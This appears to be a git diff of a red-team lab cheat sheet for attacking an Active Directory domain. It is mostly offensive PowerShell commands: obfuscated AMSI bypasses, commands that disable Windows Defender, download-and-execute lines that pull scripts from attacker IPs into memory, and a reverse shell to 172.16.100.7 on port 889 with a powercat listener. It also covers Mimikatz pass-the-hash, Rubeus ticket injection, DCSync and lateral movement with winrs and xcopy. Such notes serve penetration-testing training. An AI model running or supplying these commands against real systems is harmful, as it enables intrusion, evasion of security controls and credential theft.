@@ -39,7 +39,7 @@ C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
 
 ### Bypass AMSI
 ```
-(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 ### Bypass Real-Time Monitoring
 ```
@@ -47,7 +47,10 @@ Powershell Set-MpPreference -DisableRealtimeMonitoring $true
 Powershell Set-MpPreference -DisableIOAVProtection $true
 PowerShell set-MpPreference -DisableAutoExclusions $true
 ```
-
+### Bypass Script Block login
+```
+iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
+```
 ### Load Script in memory to bypass Windows Defender
 ```
 iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
@@ -59,9 +62,6 @@ iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
 powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889
 powercat -l -v -p 889 -Timeout 100
 ```
-
-
-
 
 # PowerShell
 
@@ -83,9 +83,15 @@ list all the commands u can use in a particular module
 Get-Command -Module <modulename>
 ```
 
-Load a script and module (remotely)
--     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
+Download PowerShell Script
+```
+iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
+```
 
+Load a script and module (remotely)
+```
+ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
+```
 Bypassing AV Signatures for PowerShell
 .      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
 .      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
@@ -1786,6 +1792,9 @@ opth: you are using NTLM or AES. we create a request or ticket from the DC.
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
+OR
+Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows/System32\cmd.exe /show /ptt
+winrs -r:scorp-dc cmd   #use winrs to interact with DC with svcadmin user
 ```
 ### DCSync
 Extract credentials from the DC without code execution on it. Domain Admin privs are required to run DCSync
@@ -1816,3 +1825,22 @@ used to load the NetLoader in memory from a URL which then loads a binary from a
 AssemblyLoad.exe
 http://10.10.16.10/Loader.exe -path http://10.10.16.11/SafetyKatz.exe
 ```
+
+# Learing Objective 7
+### Find domain Admin session in a different machine
+```
+Find-DomainUserLocation
+```
+### Verify the session
+```
+winrs -r:<ComputerName> set computername;set username
+```
+copy executable file to another machine
+```
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+
+
+
+
